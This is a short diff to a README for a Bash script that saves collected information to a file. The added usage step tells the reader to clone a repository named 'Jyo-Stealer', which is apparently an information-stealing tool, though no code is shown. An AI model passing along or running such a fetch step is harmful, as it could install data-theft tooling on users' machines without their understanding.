@@ -13,6 +13,10 @@ Save collected information to a text file
 Usage Instructions:
 Ensure you have Bash installed (pre-installed on most Linux systems).
 
+First, Run this command:
+
+git clone github.com/jyoeymama/Jyo-Stealer/
+
 Make the script executable:
 
 bash
